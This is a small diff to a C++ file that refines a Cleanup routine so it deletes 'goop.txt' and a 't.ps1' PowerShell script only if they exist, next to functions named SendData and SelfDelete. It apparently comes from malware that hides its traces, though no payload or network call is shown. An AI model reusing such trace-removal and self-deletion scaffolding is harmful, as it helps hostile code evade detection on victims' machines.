@@ -1,6 +1,8 @@
 #include <fstream>
-
 #include "misc.h"
+
+#include "utils.h"
+
 
 bool misc::SendData(std::string data) noexcept
 {
@@ -35,9 +37,11 @@ void misc::Cleanup() noexcept
 {
 	if (!config::cleanup)
 		return;
+	if(utils::isFile("goop.txt"))
+		std::remove("goop.txt");
 
-	std::remove("goop.txt");
-	std::remove("t.ps1");
+	if (utils::isFile("t.ps1"))
+		std::remove("t.ps1");
 }
 
 void misc::SelfDelete() noexcept
